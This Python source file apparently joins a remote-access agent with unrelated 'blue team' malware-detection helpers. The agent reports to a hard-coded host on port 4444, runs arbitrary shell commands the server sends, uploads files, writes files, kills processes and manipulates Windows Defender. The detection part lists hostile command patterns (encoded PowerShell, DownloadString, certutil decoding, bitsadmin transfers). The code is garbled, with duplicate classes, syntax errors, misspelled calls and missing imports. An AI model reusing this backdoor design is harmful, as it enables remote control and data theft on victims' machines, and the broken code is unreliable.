import asyncio
import base64
import csv
import getpass
import hashlib
import ipaddress
import json
import logging
import math
import mimetypes
import uuid
from collections import Counter, defaultdict, deque
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field, asdict
from typing import Any, Callable, Iterable, Mapping, Sequence
import socket
import threading
import time
import json
import os
import sys
import platform
import subprocess
import psutil
import hashlib
from datetime import datetime
import struct
import zlib
import win32com.client
import pythoncom

# Ensure the necessary library is available
try:
    import psutil
except ImportError:
    print("Error: 'psytil' library is required for full functionality.")
    sys.exit(1)
    
    
# Configuration Constants
DEFAULT_HOST = '192.168.226.2'
DEFAULT_PORT = 4444
BUFFER_SIZE = 4096
SOCKET_TIMEOUT = 10


class SystemManager:
    def __init__(self, comm_header):
        self.comm = comm_header
        # Initialize COM for Defender interactions
        pythoncom.CoInitialize()
        
    def __del__(self):
        pythoncom.CoUninitialize()
        
    def _get_defender_controller(self):
        """
        Creates the WMI connection object for Windows Defender.
        """
        try:
            # Connect to the Windows Security Center namespace
            swbemServices = win32com.client.GetObject("winmgmts:\\\\.\\root\\Microsoft\\Windows\\Defender")
            return swbemServices.ExecQuery("Select * FROM MSFT_MyComputerStatus")[0]
        except Exception as e:
            print(f"[DEFENDER] Error accessing Defender: {e}")
            return None
            
    def scan_system(self, scan_type="Full"):
        """
        Initiates a system scan.
        scan_type: 'Full', 'Quick', or 'Custom'
        """
        print(f"[DEFENDER] Starting {scan_type} scan...")
        
        try:
            # Create the scan job object
            swbemServices = win32com.client.GetObject("winmgmts:\\\\.\\root\\Microsoft\\Windows\\Defender")
            scanJob = swbemServices.Get("MSFT_MpScan")
            
            # Configure scan parameters
            scanJob.Type = 1 if scan_type == "Full" else 0 # 1 = Full, 0 = Quick
            scanJob.RebootNeeded = 0
            
            # Start the scan
            scanJob.StartScan()
            print(f"[DEFENDER] Scan started successfully.")
            return {"status": "started", "scan_id": scanJob.Id}
            
        except Exception as e:
            print(f"[DEFENDER] Failed to start scan: {e}")
            return {"status": "failed", "error": str(e)}
            
    def check_protection_status(self):
        """
        Queries the cirrent real-time protection status.
        Return the state of Windows Defender (e.g., 'enabled', 'disabled').
        """
        try:
            status = self._get_defender_controller()
            if status:
                # Attributes very slightly by Windows version, but 'RealTimeProtectionEnabled' is standard
                is_enabled = getattr(status, 'RealTimeProtectionEnabled', False)
                return {"status": "enabled" if is_enabled else "disabled"}
            else:
                return {"status": "error"}
        except Exception as e:
            print(f"[DEFENDER] Check status error: {e}")
            return {"status": "error"}
            
    def query_threats(self):
        """
        Retrieves a list of all identified threats on the system.
        This identifies malware, worm, spyware, and Trojans.
        """
        try:
            # Create the Threats collection
            swbemServices = win32com.client.GetObject("winmgmts:\\\\.\\root\\Microsoft\\Windows\\Defender")
            colThreats = swbemServices = swbemServices.ExecQuery("Slect * FROM MSFT_MpThreat")
            
            threat_list = []
            for threat in colThreats:
                threat_info = {
                    "ThreatID": threat.ID,
                    "Name": threat.DisplayName,
                    "Severity": threat.Severity,
                    "FilePath": threat.Files[0].Path if threat.Files else "N/A",
                    "ThreatCategory": threat.ThreatCategory
                }
                threat_list.append(threat_info)
                
            # Filter results for the user's requested categories
            specific_threats = {
                "malware": [t for t in threat_list if t['ThreatCategory'] == 'Malware'],
                "worms": [t for t in threat_list if t['ThreatCategory'] == 'Worm'],
                "spyware": [t for t in threat_list if t['ThreatCategory'] == 'Spyware'],
                "trojans": [t for t in threat_list if t['ThreatCategory'] == 'Trojan'],
            }
            
            return {
                "total_threats": len(threat_list),
                "specific_categories": specific_threats,
                "raw_data": threat_list
            }
            
        except Exception as e:
            print(f"[DEFENDER] Query threats error: {e}")
            return {"status": "error": str(e)}
            
    def remove_threat(self, threat_id):
        """
        Attempts to remove a specific identified threat.
        """
        try:
            # Create the action interface
            actions = win32com.client.GetObject("winmgmts:\\\\.\\root\\Microsoft\\Windows\\Defender")
            action = actions.Get("MSFT_MpThreatAction")
            
            # Set the action to 'Remove'
            action.ThreatID = threat_id
            action.Action = 2 # 2 = Remove
            
            # Execute the action
            action.Execute()
            print(f"[DEFENDER] Threat {threat_id} removed successfully.")
            return {"status": "removed"}
            
        except Exception as e:
            print(f"[DEFENDER] Failed to remove threat: {e}")
            return {"status": "failed", "error": str(e)}
        
    def enable_protection(self):
        """
        Enables Real-Time Protection and other scanning features.
        """
        try:
            # We use the configuration namespace to modify settings
            config = win32com.client.GetObject("winmgmts:\\\\.\\root\\Microsoft\\Windows\\Defender\\Configuration")
            
            # Enable Real-Time Protection
            config.SetRealTimeProtection(1) # 1 = Enabled
            config.SetNetworkProtection(1)
            config.SetSignatureUpdateInterval(1)
            
            print(f"[DEFENDER] Protection enabled.")
            return {"status": "enabled"}
            
        except Exception as e:
            print(f"[DEFENDER] Failed to enable protection: {e}")
            return {"status": "failed", "error": str(e)}
        
    def update_defender(self):
        """
        Forces an immediate signature update for Windows Defender
        """
        try:
            status = self._get_defender_controller()
            if status:
                # This triggers the update process
                status.UpdateSignature()
                print("[DEFENDER] Signature update triggered.")
                return {"status": "update_triggered}
            else:
                return {"status": "error"}
        except Exception as e:
            print(f"[DEFENDER] Update error: {e}")
            return {"status": "error"}

class CommunicationHandler:
    """
    Manages the socket connection, serialization, and deserialization of messages
    between the client and the server.
    """
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket = None
        self.is_connected = False
        self.session_id = str(int(time.time()))
        
    def establish_connection(self):
        """
        Attempts to connect to the server with a retry mechanism.
        """
        attempts = 0
        max_attempts = 3
        
        while attempts < max_attempts and not self.is_connected:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.settimeout(SOCKET_TIMEOUT)
                self.is_connected = True
                
                # Send initial handshake with metadata
                metadata = {
                    "agent_id": self.session_id,
                    "hostname": platform.node(),
                    "os_version": platform.system() + " " + platform.release(),
                    "cpu_cores": psutil.cpu_count(),
                    "timestamp": datetime.now().isoformat()
                }
                self.send_data(metadata, "handshake")
                
                print(f"[SYSTEM] Connected to server at {self.host}:{self.port}")
                
            except ConnectionRefusedError:
                attempts += 1
                print(f"[SYSTEM] Connection attempt {attempts} failed. Retrying in 5s...")
                time.sleep(5)
            except Exception as e:
                print(f"[SYSTEM] Connection error: {e}")
                self.is_connected = False
                break
                
        return self.is_connected
        
    def send_data(self, data, packet_type):
        """
        Packs data into a JSON string, add a header, and sends its over the socket.
        """
        if not self.is_connected:
            return False
            
        try:
            json_str = json.dumps(data)
            # Compress data to save bandwidth
            compressed_data = zlib.compress(json_str.encode('utf-8'))
            
            # Create packet header
            header = struct.pack('!I', len(compressed_data))
            type_byte = struct.pack('!B', self._get_packet_type_id(packet_type))
            
            # Send header + pl
            self.socket.sendall(header + type_byte + compressed_data)
            return True
            
        except Exception as e:
            print(f"[COMM] Send error: {e}")
            self.handle_disconnect()
            return False
            
    def receive_data(self):
        """
        Reads data from the socket. Handles fragmentation if necessary.
        """
        if not self.is_connected:
            return None
            
        try:
            # Read header first (4 bytes for length)
            header = self._receive_exact(BUFFER_SIZE)
            if not header:
                return None
                
            data_length = struct.unpack('I', header)[0]
            
            # Read type byte (1 byte)
            type_byte = self._receive_exact(1)
            if not type_byte:
                return None
                
            packet_type = self._get_packet_type_from_id(type_byte[0])
            
            # Read payload
            payload = self._receive_exact(data_length)
            if not payload:
                return None
                
            # Decompress payload
            decompressed_json = zlib.decompress(payload).decode('utf-8')
            return json.loads(decompressed_json), packet_type
            
        except Exception as e:
            print(f"[COMM] Receive error: {e}")
            self.handle_disconnect()
            return None
            
    def _receive_exact(self, size):
        """Helper to receive exacly 'size' bytes."""
        data = bytearray()
        while len(data) < size:
            packet = self.socket.recv(size - len(data))
            if not packet:
                return None
            data.extend(packet)
        return bytes(data)
        
    def _get_packet_type_id(self, ptype):
        """Maps string types to integer IDs."""
        mapping = {
            "command": 1,
            "file_transfer": 2,
            "status": 3,
            "error": 4
        }
        return mapping.get(ptype, 0)
        
    def _get_packet_type_from_id(self, pid):
        """Maps integer IDs back to string types."""
        mapping = {
            1: "command",
            2: "file_transfer",
            3: "status",
            4: "error"
        }
        return mapping.get(pid, "unknown")
        
    def handle_disconnec(self):
        """Handles graceful disconnection attempts."""
        self.is_connected = False
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
        print("[SYSTEM] Disconnected from server.")
        
        
class SystemManager:
    """
    Handles local system operations, file manipulation, and process control
    """
    def __init__(self, comm_handler):
        self.comm = comm_handler
        
    def gather_system_info(self):
        """Collects statistics about the target environment."""
        try:
            cpu_load = psutil.cpu_percent(interval=1)
            memory = psutil.virtual_memory()
            disk = psutil.disk_usage('/')
            
            info = {
                "cpu_percent": cpu_load,
                "memory_percent": memory.percent,
                "memory_available_gb": round(memory.available / (1024**3), 2),
                "disk_total_gb": round(disk.total / (1024**3), 2),
                "disk_used_gb": round(disk.used / (1024**3), 2),
                "disk_percent": disk.percent,
                "uptime": str(datetime.now() - datetime.fromtimestamp(psutil.boot_time()))
            }
            
            self.comm.send_data(info, "status")
            return info
            
        except Exception as e:
            print(f"[SYS] Gather info error: {e}")
            return None
            
    def list_directory(self, path='.'):
        """Recursively scans a directory for files and folders."""
        try:
            content = []
            for item in os.listdir(path):
                full_path = os.path.join(path, item)
                if os.path.isfile(full_path):
                    size = os.path.getsize(full_path)
                    content.append({"name": item, "type": "file", "size": size})
                elif os.path.isdir(full_path):
                    content.append({"name": item, "type": "directory"})
                    
            self.comm.send_data(content, "status")
            return content
            
        except Exception as e:
            print(f"[SYS] List dir error: {e}")
            return None
            
    def execute_command(self, command):
        """Executes a shell command and returns the output."""
        try:
            # Use Popen to capture output without blocking the main thread
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            stdout, stderr = process.communicate()
            
            result = {
                "return_code": process.returncode,
                "output": stdout,
                "error": stderr
            }
            
            self.comm.send_data(result, "status")
            return result
            
        except Exception as e:
            print(f"[SYS] Execute cmd error: {e}")
            return None
            
    def download_file(self, remote_path, local_path):
        try:
            if os.path.exists(remote_path):
                with open(remote_path, 'rb') as f:
                    file_data = f.read()
                    
                # Send metadata and file content
                file_metadata = {
                    "path": remote_path,
                    "size": len(file_data)
                }
                
                self.comm.send_data(file_metadata, "file_transfer")
                
                # Send file data in chunks
                chunk_size = 1024 * 1024 # 1MB chunks
                for i in range(0, len(file_data), chunk_size):
                    chunk = file_data[i:i + chunk_size]
                    self.comm.send_data(chunk, "file_transfer")
                    
                print(f"[SYS] File sent: {remote_path}")
                return True
            else:
                print(f"[SYS] File not found: {remote_path}")
                self.comm.send_data({"error": "File not found"}, error")
                return False
                
        except Exception as e:
            print(f"[SYS] Download error: {e}")
            return False
            
    def upload_file(self, remote_path, file_content):
        """Save file content to the client."""
        try:
            with open(remote_path, 'wb') as f:
                f.write(file_content)
            print(f"[SYS] File saved: {remote_path}")
            self.comm.send_data({"success": True, "path": remote_path}, "status")
            return True
        except Exception as e:
            print(f"[SYS] Upload error: {e}")
            return False
            
            
class OperationCore:
    """
    The main controller that handles the execution loop and command parsing.
    
    orchestrates the interaction between the communication handler and the system manager.
    It maintains a persistent connection and processes incoming instructions.
    """
    def __init__(self, host, port):
        self.comm = CommunicationHandler(host, port)
        self.sys_mgr = SystemManager(self.comm)
        self.running = True
        
    def start(self):
        """Initializes the connection and begins the operation loop."""
        print("[CORE] Initializing Operation Core...")
        
        if not self.comm.establish_connection():
            print("[CORE] Failed to connect. Exiting.")
            return
            
        # Initial heartbeat
        self.sys_mgr.gather_system_info()
        
        while self.running and self.comm.is_connected:
            # Wait for incoming command
            data, packet_type = self.comm.receive_data()
            
            if data is None:
                print("[CORE] Connection lost or timeout. Attempting reconnect...")
                if not self.comm.establish_connection():
                    break
                continue
                
            print(f"[CORE] Received packet type: {packet_type}")
            
            if packet_type == "command":
                self._process_command(data)
            if packet_type == "file_transfer":
                self._process_file_transfer(data)
            elif packet_type == "status":
                # Ignore status acks, just log
                print("[CORE] Server acknowledged status.")
            elif packet_type == "error":
                print(f"[CORE] Server reported error: {data}")
                
            # Small delay between checks
            time.sleep(0.5)
            
    def _process_command(self, payload):
        """Parses and executes raw command strings or JSON objects sent from the client"""
        command_str = ""
        
        if isinstance(payload, str):
            command_str = payload
        elif isinstance(payload, dict):
            command_str = payload.get("cmd", "")
            
        if not command_str:
            return
            
        print(f"[CORE] Executing: {command_str}")
        
        # Command Dispacher
        if command_str == "sys_info":
            self.sys_mgr.list_directory(".")
            
        elif command_str == "cd":
            new_dir = payload.get("path") if isinstance(payload, dict) else payload
            try:
                os.chdir(new_dir)
                self.comm.send_data({"status": "success", "cwd": os.getcwd()}, "status")
            except Exception as e:
                self.comm.send_data({"status": "fail", "reason": str(e)}, "status")
                
        elif command_str == "execute":
            cmd = payload.get("payload") if isinstance(payload, dict) else payload
            self.sys_mgr.execute_command(cmd)
                
        elif command_str == "download":
            file_path = payload.get("path") if isinstance(payload, dict) else payload
            self.sys_mgr.download_file(file_path, "./downloads")
            
        elif command_str == "upload":
            file_path = payload.get("path") if isinstance(payload, dict) else payload
            # In a real implementation, the file content would be sent separately.
            # Here we simulate a successful upload for structure.
            self.sys_mgr.upload_file(file_path, b"")
            
        elif command_str == "defender_scan":
            result = self.sys_mgr.scan_system("Full")
            self.comm.send_data(result, "status")
            
        elif command_str == "get_threats":
            threats = self.sys_mgr.query_thread()
            self.comm.send_data(threats, "status")
            if threats['total_threats'] > 0:
                # Automatically attempt to remove the first found threat
                first_id = threats['raw_data'][0]['ThreatID']
                self.sys_mgr.remove_threat(first_id)
                
        elif command_str == "defender_update":
            result = self.sys_mgr.update_defender()
            self.comm.send_data(status, "status")
            
        elif command_str == "exit":
            self.running = False
            
        elif command_str == "kill_process":
            pid = int(payload) if isinstance(payload, int) else int(payload.get("pid"))
            try:
                p = psutil.Process(pid)
                p.terminate()
                self.comm.send_data({"status": "success", "pid": pid}, "status")
            except Exception as e:
                self.comm.send_data({"status": "fail", "reason": str(e)}, "error")
                
                
BLUE_TEAM_VERSION = "1.0.0"
BLUE_TEAM_MAX_FILE_SIZE = 256 * 1024 * 1024
BLUE_TEAM_MAX_ENTROPY_SAMPLE = 2 * 1024 * 1024
BLUE_TEAM_TELEGRAM_CHUNK_SIZE = 3500
BLUE_TEAM_DEFAULT_RATE_WINDOW = 60.0
BLUE_TEAM_DEFAULT_RATE_LIMIT = 20
BLUE_TEAM_DEFAULT_SCAN_WORKERS = max(2, min(8, os.cpu_count() or 2))

BT_SUSPICIOUS_EXTENSIONS = {
    ".exe", ".dll", ".sys", ".scr", ".com", ".cpl", ".msi", ".msp",
    ".bat", ".cmd", ".ps1", ".psm1", ".vbs", ".vbe", ".js", ".jse",
    ".wsf", "..wsh", ".hta", ".jar", ".lnk", ".url", ".iso", ".img",
    ".chm", ".reg",
}
BT_SCRIPT_EXTENSIONS = {
    ".bat", ".cmd", ".ps1", ".psm1", ".vbs", ".vbe", ".js", ".jse",
    ".wsf", ".wsh", ".hta", ".py", ".pyw", ".sh", ".bash",
}
BT_EXECUTABLE_EXTENSIONS = {
    ".exe", ".dll", ".sys", ".scr", ".com", ".cpl", ".msi", ".msp",
}
BT_ARCHIVE_EXTENSIONS = {
    ".zip", ".7z", ".rar", ".cab", ".tar", ".gz", ".bz2", ".xz",
}
BT_SENSITIVE_PATH_PARTS = {
    "\\windows\\system32\\", "\\windows\\syswow64\\", "\\programdata\\",
    "\\appdata\\roaming\\", "\\appdata\\local\\temp\\", "/tmp/",
    "/var/tmp/", "/dev/shm/",
}
BT_SUSPICIOUS_PROCESS_NAMES = {
    "powershell.exe", "pwsh.exe", "cmd.exe", "wscript.exe", "cscript.exe",
    "mshta.exe", "rundll32.exe", "regsvr32.exe", "certutil.exe",
    "bitsadmin.exe", "wmic.exe", "msiexec.exe", "installutil.exe",
}
BT_COMMON_SYSTEM_NAMES = {
    "svchost.exe", "services.exe", "lsass.exe", "wininit.exe",
    "winlogon.exe", "explorer.exe", "taskhostw.exe", "spoolsv.exe",
}
BT_RISKY_PARENT_NAMES = {
    "winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe",
    "acrord32.exe", "chrome.exe", "msedge.exe", "firefox.exe",
}
BT_SUSPICIOUS_NETWORK_PORTS = {
    4444, 5555, 6667, 1337, 31337, 9001, 9002, 12345, 54321,
}
BT_MAGIC_SIGNATURES = (
    (b"MZ", "pe"),
    (b"PK\x03\x04", "zip"),
    (b"\x7fELF", "elf"),
    (b"\xca\xfe\xba\xbe", "mach"),
    (b"\xfe\xed\xfa\xce", "mach"),
    (b"%PDF-", "pdf"),
    (b"\x89PNG\r\n\x1a\n", "png"),
    (b"\xff\xd8\xff", "jpeg"),
    (b"GIF8", "gif"),
    (b"RIFF", "riff"),
)
BT_RISKY_COMMAND_PATTERNS = (
    re.compile(r'(?:^|[\s"\'])-enc(?:odedcommand)?(?:[\s"\']|$)', re.I),
    re.compile(r'(?:^|[\s"\'])-w(?:indowstyle)?\s+hidden', re.I),
    re.compile(r"downloadstring\s*\(", re.I),
    re.compile(r"invoke-expression", re.I),
    re.compile(r"iex\s*\(", re.I),
    re.compile(r"frombase64string", re.I),
    re.compile(r"certutil(?:\.exe)?\s+-decode", re.I),
    re.compile(r"bitsadmin(?:\.exe)?\s+/transfer", re.I),
    re.compile(r"mshta(?:\.exe)?\s+https?://", re.I),
)
BT_SCORE_WEIGHTS = {
    "known_bad_hash": 100,
    "suspicious_path": 20,
    "double_extension": 30,
    "script_extension": 8,
    "executable_extension": 8,
    "high_entropy": 18,
    "extension_mismatch": 35,
    "hidden_file": 6,
    "suspicious_port": 25,
    "risky_parent": 20,
    "risky_command": 25,
    "rare_process": 10,
    "new_persistence": 35,
}

def _bt_now() -> str:
    return datetime.now().astimezone().infoformat(timespace="seconds")
    
def _bt_text(value: Any, limit: int = 2048) -> str:
    if value is None:
        return ""
    try:
        value = str(value).replace("\x00", "")
    except Exception:
        value = repr(value)
    return value[:limit] if len(value) <= limit else value[:limit - 3] + "..."
    
def _bt_path(path: str | os.PathLike[str]) -> str:
    return os.path.normcase(os.path.abspath(os.fspath(path)))
    
def _bt_windows() -> bool:
    return platform.system().lower()
    
def _bt_private(ip: str) -> bool:
    try:
        addr = ipaddress.ip_address(ip)
        return addr.is_private or addr.is_loopback or addr.is_link_local
    except ValueError:
        return False
        
def _bt_public(ip: str) -> bool:
    try:
        addr = ipadsress.ip_address(ip)
        return not (
            addr.is_private or addr.is_loopback or addr.is_link_local
            or addr.is_reserved or addr.is_multicast
        )
    except ValueError:
        return False
        
def _bt_entropy(data: bytes) -> float:
    if not data:
        return 0.0
    counts = Counter(data)
    length = len(data)
    return round(
        -sum((c / length) * math.log2(c / length) for c in counts.values()),
        4,
    )
    
def _bt_magic(data: bytes) -> str:
    for signature, name in BT_MAGIC_SIGNATURES:
        if data.startswith(signature):
            return name
    return "unknown"
    
def _bt_ext(path: str) -> str:
    try:
        return pathlib.Path(path).suffix.lower()
    except Exception:
        return ""
        
def _bt_hidden(path: str) -> bool:
    try:
        name = os.path.basename(path)
        if name.startswith(".") and name not in {".", ".."}:
            return True
        if _bt_windows():
            attrs = os.startswith(path, follow_symlinks=False).st_file_attributes
            return bool(attrs & 0x2)
    except Exception:
        pass
    return False
    
def _bt_double_extension(name: str) -> bool:
    parts = pathlib.PurePath(name).name.lower().split(".")
    if len(parts) < 3:
        return False
    return (
        "." + parts[-1] in BT_SUSPICIOUS_EXTENSIONS
        and "." + parts[-2] in {
            ".pdf", ".doc", ".docx", ".xls", ".xlsx",
            ".jpg", ".jpeg", ".png", ".txt", ".rtf",
        }
    )
    
def _bt_risky_patterns(command: str) -> list[str]:
    return [pattern.pattern for pattern in BT_RISKY_COMMAND_PATTERNS if pattern.search(command or "")]
    
def _bt_chunks(text: str, size: int = BLUE_TEAM_TELEGRAM_CHUNK_SIZE) -> list[str]:
    text = text or ""
    if len(text) <= size:
        return [text]
    chunks: list[str] = []
    for start in range(0, len(text), size):
        chunks.append(text[start:start + size])
    return chunks
    
def _bt_json_default(value: Any) -> Any:
    if isinstance(value, datetime):
        return value.isoformat()
    if isinstance(value, pathlib.Path):
        return sorted(value)
    if isinstance(value, bytes):
        return base64.b64encode(value).decode()
    return _bt_text(value)
    
def _bt_json(value: Any, pretty: bool = False) -> str:
    return json.dumps(
        value, ensure_ascii=False, sort_keys=True,
        indent=2 if pretty else None,
        separators=None if pretty else (",", ":"),
        default=_bt_json_default,
    )
    
def _bt_load(path: str, default: Any) -> Any:
    try:
        with open(path, "r", encoding="utf-8") as handle:
            return json.load(handle)
    except (OSError, json.JSONDecodeError):
        return default
        
def _bt_atomic_write(path: str, value: Any) -> None:
    directory = os.path.dirname(_bt_path(path)) or "."
    os.makedirs(directory, exist_ok=True)
    fd, temp_name = tempfile.mkstemp(prefix=".bt-", suffix=".tmp", dir=directory)
    try:
        with os.fopen(fd, "w", encoding="utf-8") as handle:
            handle.write(_bt_json(value, pretty=True))
            handle.write("\n")
            handle.flush()
            os.fsync(handle.fileno())
        os.replace(temp_name, path)
    finally:
        try:
            os.unlink(temp_name)
        except FileNotFoundError:
            pass